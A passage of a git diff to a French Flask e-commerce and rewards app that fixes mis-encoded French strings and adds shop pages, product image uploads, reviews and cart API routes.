             message = f"Vous avez obtenu {score} points sur 25."
 
@@ -3575,7 +3698,7 @@ def questions_lundi():
 def admin_activer_user(username):
     admin = get_logged_in_admin()
     if not admin:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("admin_finance"))
 
     user = User.query.filter_by(username=username).first()
@@ -3584,21 +3707,21 @@ def admin_activer_user(username):
         return redirect(url_for("admin_deposits"))
 
     if user.premier_depot:
-        flash("Cet utilisateur est d├®j├á actif.", "warning")
+        flash("Cet utilisateur est déjà actif.", "warning")
         return redirect(url_for("admin_deposits"))
 
-    # ­ƒöÑ Montant dÔÇÖactivation (tu peux changer)
+    # 🔥 Montant d’activation (tu peux changer)
     montant_activation = 0
 
     # Activer user
     user.premier_depot = True
 
-    # Si tu veux cr├®diter aussi automatiquement
+    # Si tu veux créditer aussi automatiquement
     if montant_activation > 0:
         user.solde_depot += montant_activation
         user.solde_total += montant_activation
 
-        # Cr├®er un d├®p├┤t valid├® (recommand├® pour historique)
+        # Créer un dépôt validé (recommandé pour historique)
         depot = Depot(
             user_name=user.username,
             phone=user.phone,
@@ -3613,7 +3736,7 @@ def admin_activer_user(username):
             donner_commission(user.parrain, montant_activation)
 
     db.session.commit()
-    flash("Utilisateur activ├® avec succ├¿s !", "success")
+    flash("Utilisateur activé avec succès !", "success")
     return redirect(url_for("admin_deposits"))
 
 
@@ -3625,7 +3748,7 @@ def tiktok_complete():
     current_date = datetime.today().strftime("%Y-%m-%d")
 
     if today != 1:
-        return {"status": "error", "message": "La vid├®o nÔÇÖest disponible que le mardi."}
+        return {"status": "error", "message": "La vidéo n’est disponible que le mardi."}
 
     if user.last_tiktok_date != current_date:
         user.points_tiktok += 20
@@ -3633,9 +3756,9 @@ def tiktok_complete():
         user.points += 20
         user.last_tiktok_date = current_date
         db.session.commit()
-        return {"status": "ok", "message": "Points ajout├®s"}
+        return {"status": "ok", "message": "Points ajoutés"}
 
-    return {"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."}
+    return {"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."}
 
 
 @app.route("/tiktok")
@@ -3672,16 +3795,16 @@ def youtube_complete():
     current_date = datetime.today().strftime("%Y-%m-%d")
 
     if today != 2:
-        return jsonify({"status": "error", "message": "La vid├®o nÔÇÖest disponible que le mercredi."})
+        return jsonify({"status": "error", "message": "La vidéo n’est disponible que le mercredi."})
 
     if user.last_youtube_date != current_date:
         user.points_youtube += 20
         user.points += 20
         user.last_youtube_date = current_date
         db.session.commit()
-        return jsonify({"status": "ok", "message": "Points ajout├®s"})
+        return jsonify({"status": "ok", "message": "Points ajoutés"})
 
-    return jsonify({"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."})
+    return jsonify({"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."})
 
 @app.route("/instagram")
 def instagram_page():
@@ -3703,45 +3826,45 @@ def instagram_complete():
     current_date = datetime.today().strftime("%Y-%m-%d")
 
     if today != 4:
-        return jsonify({"status": "error", "message": "La vid├®o nÔÇÖest disponible que le jeudi."})
+        return jsonify({"status": "error", "message": "La vidéo n’est disponible que le jeudi."})
 
     if user.last_instagram_date != current_date:
         user.points_instagram += 20
         user.points += 20
         user.last_instagram_date = current_date
         db.session.commit()
-        return jsonify({"status": "ok", "message": "Points ajout├®s"})
+        return jsonify({"status": "ok", "message": "Points ajoutés"})
 
-    return jsonify({"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."})
+    return jsonify({"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."})
 
 @app.route("/health")
 def health():
     return {"status": "ok"}, 200
 
 
-# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-# ­ƒÅ¬ ROUTES POUR LES BOUTIQUES ET VENDEURS
-# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ──────────────────────────────────────────────────────
+# 🏪 ROUTES POUR LES BOUTIQUES ET VENDEURS
+# ──────────────────────────────────────────────────────
 
-# Liste des cat├®gories pr├®d├®finies
+# Liste des catégories prédéfinies
 CATEGORIES_PREDEFINIES = [
-    {"nom": "Mode & V├¬tements", "icone": "­ƒæò", "description": "V├¬tements, chaussures, accessoires de mode"},
-    {"nom": "├ëlectronique", "icone": "­ƒô▒", "description": "T├®l├®phones, ordinateurs, accessoires ├®lectroniques"},
-    {"nom": "Maison & Jardin", "icone": "­ƒÅá", "description": "D├®coration, meubles, articles de maison"},
-    {"nom": "Beaut├® & Sant├®", "icone": "­ƒÆä", "description": "Cosm├®tiques, produits de beaut├®, sant├®"},
-    {"nom": "Sports & Loisirs", "icone": "ÔÜ¢", "description": "├ëquipements sportifs, loisirs, plein air"},
-    {"nom": "Livres & M├®dias", "icone": "­ƒôÜ", "description": "Livres, musique, films, jeux vid├®o"},
-    {"nom": "Alimentation", "icone": "­ƒìö", "description": "Produits alimentaires, boissons, ├®picerie"},
-    {"nom": "B├®b├® & Enfant", "icone": "­ƒæÂ", "description": "Articles pour b├®b├®s et enfants"},
-    {"nom": "Animaux", "icone": "­ƒÉò", "description": "Accessoires et produits pour animaux"},
-    {"nom": "Auto & Moto", "icone": "­ƒÜù", "description": "Pi├¿ces d├®tach├®es, accessoires automobiles"},
-    {"nom": "Art & Artisanat", "icone": "­ƒÄ¿", "description": "┼Æuvres d'art, faits main, artisanat"},
-    {"nom": "Autre", "icone": "­ƒôª", "description": "Autres cat├®gories non list├®es"},
+    {"nom": "Mode & Vêtements", "icone": "👕", "description": "Vêtements, chaussures, accessoires de mode"},
+    {"nom": "Électronique", "icone": "📱", "description": "Téléphones, ordinateurs, accessoires électroniques"},
+    {"nom": "Maison & Jardin", "icone": "🏠", "description": "Décoration, meubles, articles de maison"},
+    {"nom": "Beauté & Santé", "icone": "💄", "description": "Cosmétiques, produits de beauté, santé"},
+    {"nom": "Sports & Loisirs", "icone": "⚽", "description": "Équipements sportifs, loisirs, plein air"},
+    {"nom": "Livres & Médias", "icone": "📚", "description": "Livres, musique, films, jeux vidéo"},
+    {"nom": "Alimentation", "icone": "🍔", "description": "Produits alimentaires, boissons, épicerie"},
+    {"nom": "Bébé & Enfant", "icone": "👶", "description": "Articles pour bébés et enfants"},
+    {"nom": "Animaux", "icone": "🐕", "description": "Accessoires et produits pour animaux"},
+    {"nom": "Auto & Moto", "icone": "🚗", "description": "Pièces détachées, accessoires automobiles"},
+    {"nom": "Art & Artisanat", "icone": "🎨", "description": "Œuvres d'art, faits main, artisanat"},
+    {"nom": "Autre", "icone": "📦", "description": "Autres catégories non listées"},
 ]
 
 
 def init_categories():
-    """Initialise les cat├®gories par d├®faut si elles n'existent pas"""
+    """Initialise les catégories par défaut si elles n'existent pas"""
     for cat in CATEGORIES_PREDEFINIES:
         if not Categorie.query.filter_by(nom=cat["nom"]).first():
             nouvelle_cat = Categorie(
@@ -3758,7 +3881,7 @@ def init_categories():
 
 @app.route("/api/categories")
 def api_categories():
-    """Retourne la liste des cat├®gories en JSON"""
+    """Retourne la liste des catégories en JSON"""
     categories = Categorie.query.order_by(Categorie.nom).all()
     return jsonify([{
         "id": c.id,
@@ -3771,13 +3894,13 @@ def api_categories():
 @app.route("/boutique/creer", methods=["GET", "POST"])
 @login_required
 def creer_boutique():
-    """Page pour cr├®er une nouvelle boutique"""
+    """Page pour créer une nouvelle boutique"""
     user = get_logged_in_user()
 
-    # V├®rifier si l'utilisateur a d├®j├á une boutique
+    # Vérifier si l'utilisateur a déjà une boutique
     existing_boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
     if existing_boutique:
-        flash("Vous avez d├®j├á une boutique active.", "warning")
+        flash("Vous avez déjà une boutique active.", "warning")
         return redirect(url_for("ma_boutique", boutique_id=existing_boutique.id))
 
     if request.method == "POST":
@@ -3811,7 +3934,7 @@ def creer_boutique():
         db.session.add(nouvelle_boutique)
         db.session.commit()
 
-        flash("Boutique cr├®├®e avec succ├¿s ! ­ƒÄë", "success")
+        flash("Boutique créée avec succès ! 🎉", "success")
         return redirect(url_for("ma_boutique", boutique_id=nouvelle_boutique.id))
 
     return render_template("boutique_creer.html", user=user)
@@ -3829,12 +3952,18 @@ def ma_boutique(boutique_id):
     avis = AvisBoutique.query.filter_by(boutique_id=boutique_id).all()
     note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0
 
+    # Compter les commandes en attente et les ventes confirmées
+    commandes_en_attente = Commande.query.filter_by(boutique_id=boutique_id, statut='en_attente').count()
+    ventes_confirmees = Commande.query.filter_by(boutique_id=boutique_id, statut='confirmee').count()
+
     return render_template("boutique_view.html",
         boutique=boutique,
         produits=produits,
         note_moyenne=note_moyenne,
         nb_avis=len(avis),
-        user=user
+        user=user,
+        nb_commandes_en_attente=commandes_en_attente,
+        nb_ventes=ventes_confirmees
     )
 
 
@@ -3845,9 +3974,9 @@ def configurer_boutique(boutique_id):
     boutique = Boutique.query.get_or_404(boutique_id)
     user = get_logged_in_user()
 
-    # V├®rifier que l'utilisateur est le propri├®taire
+    # Vérifier que l'utilisateur est le propriétaire
     if boutique.user_id != user.id:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("dashboard_page"))
 
     if request.method == "POST":
@@ -3868,23 +3997,65 @@ def configurer_boutique(boutique_id):
                 filename = secure_filename(f"logo_{boutique.id}_{file.filename}")
                 filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                 file.save(filepath)
-                boutique.logo = f"/{filepath}"
+                # Convertir le chemin absolu en chemin relatif pour le web
+                boutique.logo = filepath.replace(os.path.join(app.root_path, 'static'), '/static').replace('\\', '/')
 
-        # Gestion de la banni├¿re
+        # Gestion de la bannière
         if "banniere" in request.files:
             file = request.files["banniere"]
             if file and allowed_file(file.filename):
                 filename = secure_filename(f"banniere_{boutique.id}_{file.filename}")
                 filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                 file.save(filepath)
-                boutique.banniere = f"/{filepath}"
+                # Convertir le chemin absolu en chemin relatif pour le web
+                boutique.banniere = filepath.replace(os.path.join(app.root_path, 'static'), '/static').replace('\\', '/')
 
         db.session.commit()
-        flash("Boutique mise ├á jour avec succ├¿s !", "success")
+        flash("Boutique mise à jour avec succès !", "success")
         return redirect(url_for("ma_boutique", boutique_id=boutique.id))
 
     return render_template("boutique_config.html", boutique=boutique, user=user)
 
+
+# ============================================
+# CONFIGURATION UPLOAD D'IMAGES PRODUITS
+# ============================================
+UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads', 'products')
+ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'webp'}
+MAX_CONTENT_LENGTH = 5 * 1024 * 1024  # 5MB max
+
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH
+
+def allowed_file(filename):
+    """Vérifie si l'extension du fichier est autorisée"""
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+def save_product_image(file):
+    """
+    Sauvegarde une image de produit et retourne le chemin relatif
+    Retourne None si le fichier n'est pas valide
+    """
+    if not file or not file.filename:
+        return None
+    
+    if not allowed_file(file.filename):
+        return None
+    
+    # Générer un nom de fichier unique
+    import uuid
+    ext = file.filename.rsplit('.', 1)[1].lower()
+    unique_filename = f"{uuid.uuid4().hex}.{ext}"
+    
+    # Créer le dossier s'il n'existe pas
+    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+    
+    # Sauvegarder le fichier
+    filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
+    file.save(filepath)
+    
+    # Retourner le chemin relatif pour la base de données
+    return f"uploads/products/{unique_filename}"
 
 @app.route("/boutique/<int:boutique_id>/produit/ajouter", methods=["GET", "POST"])
 @login_required
@@ -3893,9 +4064,9 @@ def ajouter_produit(boutique_id):
     boutique = Boutique.query.get_or_404(boutique_id)
     user = get_logged_in_user()
 
-    # V├®rifier que l'utilisateur est le propri├®taire
+    # Vérifier que l'utilisateur est le propriétaire
     if boutique.user_id != user.id:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("dashboard_page"))
 
     categories = Categorie.query.order_by(Categorie.nom).all()
@@ -3914,6 +4085,16 @@ def ajouter_produit(boutique_id):
             flash("Le nom et le prix sont obligatoires.", "danger")
             return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)
 
+        # Gérer l'upload d'image
+        image_path = None
+        if 'image' in request.files:
+            file = request.files['image']
+            if file and file.filename != '':
+                image_path = save_product_image(file)
+                if image_path is None:
+                    flash("Type de fichier non autorisé. Utilisez JPG, PNG ou WebP.", "danger")
+                    return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)
+
         nouveau_produit = Produit(
             boutique_id=boutique.id,
             nom=nom,
@@ -3924,13 +4105,17 @@ def ajouter_produit(boutique_id):
             categorie_id=categorie_id if categorie_id else None,
             couleurs_disponibles=couleurs,
             tailles_disponibles=tailles,
-            est_en_promo=prix_promo is not None and prix_promo < prix
+            est_en_promo=prix_promo is not None and prix_promo < prix,
+            images=image_path if image_path else None
         )
+
+        # Générer un slug unique pour le produit
+        nouveau_produit.slug = nouveau_produit.generate_slug()
 
         db.session.add(nouveau_produit)
         db.session.commit()
 
-        flash("Produit ajout├® avec succ├¿s !", "success")
+        flash("Produit ajouté avec succès !", "success")
         return redirect(url_for("ma_boutique", boutique_id=boutique.id))
 
     return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)
@@ -3944,14 +4129,17 @@ def modifier_produit(boutique_id, produit_id):
     produit = Produit.query.get_or_404(produit_id)
     user = get_logged_in_user()
 
-    # V├®rifier que l'utilisateur est le propri├®taire
+    # Vérifier que l'utilisateur est le propriétaire
     if boutique.user_id != user.id:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("dashboard_page"))
 
     categories = Categorie.query.order_by(Categorie.nom).all()
 
     if request.method == "POST":
+        ancien_nom = produit.nom
+        ancienne_images = produit.images  # Sauvegarder l'ancien chemin
+        
         produit.nom = request.form.get("nom", "").strip()
         produit.description = request.form.get("description", "").strip()
         produit.prix = request.form.get("prix", type=float)
@@ -3962,8 +4150,32 @@ def modifier_produit(boutique_id, produit_id):
         produit.tailles_disponibles = request.form.get("tailles", "").strip()
         produit.est_en_promo = produit.prix_promo is not None and produit.prix_promo < produit.prix
 
+        # Gérer l'upload d'une nouvelle image
+        if 'image' in request.files:
+            file = request.files['image']
+            if file and file.filename != '':
+                image_path = save_product_image(file)
+                if image_path is None:
+                    flash("Type de fichier non autorisé. Utilisez JPG, PNG ou WebP.", "danger")
+                    return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)
+                
+                # Supprimer l'ancienne image du disque si elle existe
+                if ancienne_images:
+                    try:
+                        old_path = os.path.join(app.root_path, 'static', ancienne_images)
+                        if os.path.exists(old_path):
+                            os.remove(old_path)
+                    except Exception as e:
+                        print(f"Erreur suppression ancienne image: {e}")
+                
+                produit.images = image_path
+
+        # Régénérer le slug si le nom a changé
+        if produit.nom != ancien_nom:
+            produit.slug = produit.generate_slug()
+
         db.session.commit()
-        flash("Produit mis ├á jour avec succ├¿s !", "success")
+        flash("Produit mis à jour avec succès !", "success")
         return redirect(url_for("ma_boutique", boutique_id=boutique.id))
 
     return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)
@@ -3977,15 +4189,15 @@ def supprimer_produit(boutique_id, produit_id):
     produit = Produit.query.get_or_404(produit_id)
     user = get_logged_in_user()
 
-    # V├®rifier que l'utilisateur est le propri├®taire
+    # Vérifier que l'utilisateur est le propriétaire
     if boutique.user_id != user.id:
-        flash("Acc├¿s refus├®.", "danger")
+        flash("Accès refusé.", "danger")
         return redirect(url_for("dashboard_page"))
 
     db.session.delete(produit)
     db.session.commit()
 
-    flash("Produit supprim├® avec succ├¿s.", "success")
+    flash("Produit supprimé avec succès.", "success")
     return redirect(url_for("ma_boutique", boutique_id=boutique.id))
 
 
@@ -4012,7 +4224,8 @@ def liste_produits():
     produits = query.order_by(Produit.date_creation.desc()).limit(50).all()
     categories = Categorie.query.order_by(Categorie.nom).all()
 
-    return render_template("produits_liste.html",
+    # Retourne la page products.html existante avec les produits
+    return render_template("products.html",
         produits=produits,
         categories=categories,
         categorie_actuelle=categorie_id,
@@ -4023,206 +4236,500 @@ def liste_produits():
 
 @app.route("/produit/<int:produit_id>")
 def voir_produit(produit_id):
-    """Page d├®tail d'un produit"""
+    """Page détail d'un produit (vue vendeur/admin)"""
     produit = Produit.query.get_or_404(produit_id)
     user = get_logged_in_user()
 
-    # Incr├®menter le compteur de vues
+    # Incrémenter le compteur de vues
     produit.vues = (produit.vues or 0) + 1
     db.session.commit()
 
     return render_template("produit_detail.html", produit=produit, user=user)
 
 
-@app.route("/boutique/<int:boutique_id>/supprimer")
-@login_required
-def supprimer_boutique(boutique_id):
-    """Supprimer une boutique (d├®sactivation logique)"""
-    boutique = Boutique.query.get_or_404(boutique_id)
-    user = get_logged_in_user()
+# ──────────────────────────────────────────────────────
+# 🛍️ ROUTES PUBLIQUES POUR LES CLIENTS
+# ──────────────────────────────────────────────────────
 
-    # V├®rifier que l'utilisateur est le propri├®taire
-    if boutique.user_id != user.id:
-        flash("Acc├¿s refus├®.", "danger")
-        return redirect(url_for("dashboard_page"))
-
-    # D├®sactiver la boutique (soft delete)
-    boutique.est_actif = False
+@app.route("/product/<slug>")
+def voir_produit_public(slug):
+    """Page produit publique pour les clients (URL avec slug)"""
+    produit = Produit.query.filter_by(slug=slug, est_actif=True).first_or_404()
+    
+    # Incrémenter le compteur de vues
+    produit.vues = (produit.vues or 0) + 1
     db.session.commit()
-
-    flash("Boutique supprim├®e avec succ├¿s.", "success")
-    return redirect(url_for("dashboard_page"))
-
-
-@app.route("/boutiques")
-def liste_boutiques():
-    """Page publique pour voir toutes les boutiques"""
+    
+    # Vérifier si l'utilisateur connecté est le propriétaire
     user = get_logged_in_user()
-    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(50).all()
+    is_owner = user and produit.boutique.user_id == user.id
+    
+    # Produits similaires (même catégorie ou boutique)
+    produits_similaires = []
+    if produit.categorie_id:
+        produits_similaires = Produit.query.filter(
+            Produit.categorie_id == produit.categorie_id,
+            Produit.id != produit.id,
+            Produit.est_actif == True
+        ).order_by(Produit.date_creation.desc()).limit(4).all()
+    else:
+        produits_similaires = Produit.query.filter(
+            Produit.boutique_id != produit.boutique_id,
+            Produit.est_actif == True
+        ).order_by(Produit.date_creation.desc()).limit(4).all()
+    
+    return render_template("product_public.html", 
+        produit=produit, 
+        user=user,
+        is_owner=is_owner,
+        produits_similaires=produits_similaires
+    )
 
-    return render_template("boutiques_liste.html", boutiques=boutiques, user=user)
+
+@app.route("/shop/<username>")
+def boutique_publique(username):
+    """Page boutique publique pour les clients"""
+    # Trouver l'utilisateur par son username
+    vendeur = User.query.filter_by(username=username).first_or_404()
+
+    # Trouver la boutique active du vendeur
+    boutique = Boutique.query.filter_by(user_id=vendeur.id, est_actif=True).first()
+    if not boutique:
+        flash("Cette boutique n'existe pas ou n'est plus active.", "danger")
+        return redirect(url_for("index_page"))
+
+    # Récupérer tous les produits actifs de la boutique
+    produits = Produit.query.filter_by(boutique_id=boutique.id, est_actif=True).order_by(Produit.date_creation.desc()).all()
+
+    # Récupérer les avis de la boutique
+    avis = AvisBoutique.query.filter_by(boutique_id=boutique.id).order_by(AvisBoutique.date_creation.desc()).all()
+    
+    # Calculer la note moyenne
+    note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0
+
+    user = get_logged_in_user()
+
+    return render_template("shop_public.html",
+        boutique=boutique,
+        vendeur=vendeur,
+        produits=produits,
+        avis=avis,
+        note_moyenne=note_moyenne,
+        nb_avis=len(avis),
+        user=user
+    )
 
 
-# Initialiser les cat├®gories au d├®marrage
-with app.app_context():
-    try:
-        init_categories()
-    except:
-        pass  # Ignore les erreurs si la table n'existe pas encore
-
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))  # Render fournit le PORT
-    app.run(host="0.0.0.0", port=port, debug=False)
+@app.route("/shop/<username>/avis", methods=["POST"])
+@login_required
+def ajouter_avis_boutique(username):
+    """Ajouter un avis/commentaire sur une boutique"""
+    vendeur = User.query.filter_by(username=username).first_or_404()
+    boutique = Boutique.query.filter_by(user_id=vendeur.id, est_actif=True).first()
+    
+    if not boutique:
+        flash("Boutique introuvable.", "danger")
+        return redirect(url_for("index_page"))
+    
+    user = get_logged_in_user()
+    
+    # Vérifier que l'utilisateur n'est pas le propriétaire
+    if user.id == vendeur.id:
+        flash("Vous ne pouvez pas laisser un avis sur votre propre boutique.", "warning")
+        return redirect(url_for("boutique_publique", username=username))
+    
+    # Vérifier si l'utilisateur a déjà laissé un avis
+    existing_avis = AvisBoutique.query.filter_by(boutique_id=boutique.id, user_id=user.id).first()
+    if existing_avis:
+        flash("Vous avez déjà laissé un avis sur cette boutique.", "warning")
+        return redirect(url_for("boutique_publique", username=username))
+    
+    note = request.form.get("note", type=int)
+    commentaire = request.form.get("commentaire", "").strip()
+    
+    if not note or note < 1 or note > 5:
+        flash("La note doit être entre 1 et 5.", "danger")
+        return redirect(url_for("boutique_publique", username=username))
+    
+    if not commentaire:
+        flash("Le commentaire est obligatoire.", "danger")
+        return redirect(url_for("boutique_publique", username=username))
+    
+    nouvel_avis = AvisBoutique(
+        boutique_id=boutique.id,
+        user_id=user.id,
+        note=note,
+        commentaire=commentaire
+    )
+    
+    db.session.add(nouvel_avis)
+    db.session.commit()
+    
+    flash("Votre avis a été publié avec succès ! 🎉", "success")
+    return redirect(url_for("boutique_publique", username=username))
 
 
 # ==============================
-# 🛒 SYSTEME DE PANIER - ROUTES API
+# 🛒 API PANIER COMPLÈTE
 # ==============================
 
 def get_or_create_panier():
-    """Récupère ou crée un panier pour l'utilisateur connecté ou la session"""
+    """
+    Récupère ou crée un panier pour l'utilisateur courant.
+    - Si connecté : panier lié au user_id
+    - Si non connecté : panier lié au session_id
+    Retourne le panier et un booléen indiquant si c'est un utilisateur connecté.
+    """
     user = get_logged_in_user()
-    session_id = session.get("session_id")
+    session_id = session.get('panier_session_id')
     
     if user:
+        # Utilisateur connecté : on cherche son panier
         panier = Panier.query.filter_by(user_id=user.id).first()
         if not panier:
             panier = Panier(user_id=user.id)
             db.session.add(panier)
             db.session.commit()
-        return panier, user
+        # Si un panier session existait, on le fusionne
+        if session_id:
+            fusionner_panier_session(session_id, panier)
+            session.pop('panier_session_id', None)
+        return panier, True
     else:
+        # Utilisateur non connecté : on utilise session_id
         if not session_id:
-            session["session_id"] = session_id = str(uuid.uuid4())
+            session_id = str(uuid.uuid4())
+            session['panier_session_id'] = session_id
         panier = Panier.query.filter_by(session_id=session_id).first()
         if not panier:
             panier = Panier(session_id=session_id)
             db.session.add(panier)
             db.session.commit()
-        return panier, None
+        return panier, False
 
 
-@app.route("/api/panier")
-def api_panier():
-    """API: Récupérer le contenu du panier"""
-    panier, user = get_or_create_panier()
+def fusionner_panier_session(session_id, panier_user):
+    """
+    Fusionne le panier d'une session dans le panier d'un utilisateur connecté.
+    """
+    panier_session = Panier.query.filter_by(session_id=session_id).first()
+    if not panier_session:
+        return
+    
+    for article_session in panier_session.articles:
+        # Chercher si l'article existe déjà dans le panier utilisateur
+        article_user = ArticlePanier.query.filter_by(
+            panier_id=panier_user.id,
+            produit_id=article_session.produit_id
+        ).first()
+        
+        if article_user:
+            # Ajouter la quantité
+            article_user.quantite += article_session.quantite
+        else:
+            # Créer un nouvel article
+            nouvel_article = ArticlePanier(
+                panier_id=panier_user.id,
+                produit_id=article_session.produit_id,
+                quantite=article_session.quantite
+            )
+            db.session.add(nouvel_article)
+    
+    # Supprimer le panier session
+    db.session.delete(panier_session)
+    db.session.commit()
+
+
+@app.route("/api/panier", methods=["GET"])
+def api_get_panier():
+    """Récupérer le contenu du panier"""
+    panier, is_authenticated = get_or_create_panier()
     
     articles = []
     for article in panier.articles:
         produit = article.produit
-        prix = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
+        prix_actuel = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
         articles.append({
-            "id": article.id,
-            "produit_id": produit.id,
-            "nom": produit.nom,
-            "prix": prix,
-            "quantite": article.quantite,
-            "image": produit.image_principale,
-            "sous_total": prix * article.quantite
+            'id': article.id,
+            'produit_id': produit.id,
+            'nom': produit.nom,
+            'prix': prix_actuel,
+            'prix_original': produit.prix,
+            'quantite': article.quantite,
+            'image': produit.image_principale,
+            'sous_total': prix_actuel * article.quantite
         })
     
+    total = panier.get_total()
+    item_count = panier.get_item_count()
+    
     return jsonify({
-        "success": True,
-        "articles": articles,
-        "total": panier.get_total(),
-        "item_count": panier.get_item_count()
+        'success': True,
+        'articles': articles,
+        'total': total,
+        'item_count': item_count
     })
-
-
-@app.route("/api/panier/count")
-def api_panier_count():
-    """API: Nombre d'articles dans le panier"""
-    panier, user = get_or_create_panier()
-    return jsonify({"count": panier.get_item_count()})
 
 
 @app.route("/api/panier/ajouter", methods=["POST"])
 def api_ajouter_panier():
-    """API: Ajouter un article au panier"""
+    """Ajouter un produit au panier"""
     data = request.get_json()
     produit_id = data.get("produit_id")
     quantite = data.get("quantite", 1)
     
-    if not produit_id:
-        return jsonify({"success": False, "message": "produit_id requis"}), 400
+    if not produit_id or quantite < 1:
+        return jsonify({"success": False, "message": "Données invalides"}), 400
     
     produit = Produit.query.get(produit_id)
-    if not produit:
-        return jsonify({"success": False, "message": "Produit introuvable"}), 404
+    if not produit or not produit.est_actif:
+        return jsonify({"success": False, "message": "Produit non disponible"}), 404
     
-    if produit.quantite < quantite:
-        return jsonify({"success": False, "message": "Stock insuffisant"}), 400
+    # Vérifier le stock
+    if produit.quantite and quantite > produit.quantite:
+        return jsonify({"success": False, "message": f"Stock insuffisant ({produit.quantite} disponible)"}), 400
     
-    panier, user = get_or_create_panier()
+    panier, _ = get_or_create_panier()
     
-    # Vérifier si l'article existe déjà
-    article = ArticlePanier.query.filter_by(panier_id=panier.id, produit_id=produit_id).first()
+    # Chercher si l'article existe déjà
+    article = ArticlePanier.query.filter_by(
+        panier_id=panier.id,
+        produit_id=produit_id
+    ).first()
+    
     if article:
-        article.quantite += quantite
+        nouvelle_quantite = article.quantite + quantite
+        if produit.quantite and nouvelle_quantite > produit.quantite:
+            return jsonify({"success": False, "message": f"Stock insuffisant ({produit.quantite} disponible)"}), 400
+        article.quantite = nouvelle_quantite
     else:
-        article = ArticlePanier(panier_id=panier.id, produit_id=produit_id, quantite=quantite)
+        article = ArticlePanier(
+            panier_id=panier.id,
+            produit_id=produit_id,
+            quantite=quantite
+        )
         db.session.add(article)
+    
+    # Incrémenter le compteur d'ajouts au panier
+    produit.ajouts_panier = (produit.ajouts_panier or 0) + 1
     
     db.session.commit()
     
     return jsonify({
         "success": True,
-        "message": "Article ajouté au panier",
+        "message": "Produit ajouté au panier",
         "item_count": panier.get_item_count()
     })
 
 
 @app.route("/api/panier/<int:article_id>", methods=["PUT"])
-def api_modifier_article(article_id):
-    """API: Modifier la quantité d'un article"""
+def api_modifier_article_panier(article_id):
+    """Modifier la quantité d'un article dans le panier"""
     data = request.get_json()
     nouvelle_quantite = data.get("quantite", 1)
     
-    article = ArticlePanier.query.get(article_id)
-    if not article:
-        return jsonify({"success": False, "message": "Article introuvable"}), 404
+    article = ArticlePanier.query.get_or_404(article_id)
+    panier, is_authenticated = get_or_create_panier()
+    
+    # Vérifier que l'article appartient au panier courant
+    if article.panier_id != panier.id:
+        return jsonify({"success": False, "message": "Article non trouvé dans le panier"}), 404
     
     if nouvelle_quantite < 1:
         # Supprimer l'article
         db.session.delete(article)
         db.session.commit()
-        return jsonify({"success": True, "message": "Article supprimé"})
+        return jsonify({
+            "success": True,
+            "message": "Article supprimé du panier",
+            "item_count": panier.get_item_count()
+        })
     
-    if article.produit.quantite < nouvelle_quantite:
-        return jsonify({"success": False, "message": "Stock insuffisant"}), 400
+    # Vérifier le stock
+    if article.produit.quantite and nouvelle_quantite > article.produit.quantite:
+        return jsonify({"success": False, "message": f"Stock insuffisant ({article.produit.quantite} disponible)"}), 400
     
     article.quantite = nouvelle_quantite
     db.session.commit()
     
-    return jsonify({"success": True, "message": "Quantité mise à jour"})
+    return jsonify({
+        "success": True,
+        "message": "Quantité mise à jour",
+        "item_count": panier.get_item_count()
+    })
 
 
 @app.route("/api/panier/<int:article_id>", methods=["DELETE"])
-def api_supprimer_article(article_id):
-    """API: Supprimer un article du panier"""
